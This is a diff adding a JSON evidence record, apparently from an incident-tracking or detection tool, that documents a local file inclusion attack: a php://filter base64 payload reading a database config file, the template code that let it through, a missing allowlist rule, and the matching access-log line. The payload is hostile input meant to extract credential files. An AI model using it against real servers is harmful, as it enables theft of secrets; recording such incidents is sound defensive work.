@@ -1,0 +1,24 @@
+{
+  "schema": "lfi-evidence/v2",
+  "incident": {
+    "correlation_id": "LFI-LINC-0003",
+    "attack": {
+      "input": "php://filter/convert.base64-encode/resource=/srv/app/config/db.yaml",
+      "encoding": "php-wrapper"
+    },
+    "trigger": {
+      "file": "internal/web/template.go",
+      "line": 56,
+      "symbol": "loadTemplate"
+    },
+    "permission": {
+      "decision": "permit",
+      "rule": "stream-wrapper allowlist missing php://filter"
+    },
+    "log": {
+      "path": "/var/log/app/access-2026-11-21.log",
+      "line": 13022,
+      "snippet": "GET /tpl?name=php://filter/convert.base64-encode/resource=/srv/app/config/db.yaml 200"
+    }
+  }
+}
